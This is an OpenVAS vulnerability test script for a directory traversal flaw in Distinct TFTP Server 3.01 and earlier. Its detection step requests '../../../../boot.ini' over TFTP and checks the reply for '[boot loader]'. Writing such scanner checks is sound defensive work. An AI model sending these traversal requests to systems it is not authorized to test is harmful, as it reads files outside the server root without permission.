###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_distinct_tftp_server_dir_trav_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Distinct TFTP Server Directory Traversal Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation allows an attacker to obtain sensitive information
  and launch further attacks.
  Impact Level: Application";
tag_affected = "Distinct TFTP Server version 3.01 and prior";
tag_insight = "The flaw is caused due an input validation error within the TFTP service
  and can be exploited to download or manipulate files in arbitrary locations
  outside the TFTP root via specially crafted directory traversal sequences.";
tag_solution = "No solution or patch is available as of 09th April, 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.distinct.com";
tag_summary = "This host is running Distinct TFTP Server and is prone to directory
  traversal vulnerability.";

if(description)
{
  script_id(802623);
  script_bugtraq_id(52938);
  script_version("$Revision: 12 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-04-09 15:15:15 +0530 (Mon, 09 Apr 2012)");
  script_name("Distinct TFTP Server Directory Traversal Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/80984");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/52938");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/18718");
  script_xref(name : "URL" , value : "http://www.spentera.com/advisories/2012/SPN-01-2012.pdf");

  script_description(desc);
  script_summary("Check for the directory traversal attack on Distinct TFTP Server");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Remote file access");
  script_require_keys("Services/udp/tftp");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("tftp.inc");
include("network_func.inc");

## Variable Initialization
port = 0;
res = "";

## Check for tftp service
port = get_kb_item("Services/udp/tftp");
if(!port){
  port = 69;
}

## Check Port State
if(!check_udp_port_status(dport:port)){
  exit(0);
}

## Try Directory traversal Attack
res = tftp_get(path:"../../../../../../../../../../../../../../boot.ini",
               port:port);

## Confirm exploit worked by checking the response
if("[boot loader]" >< res){
  security_warning(port);
}
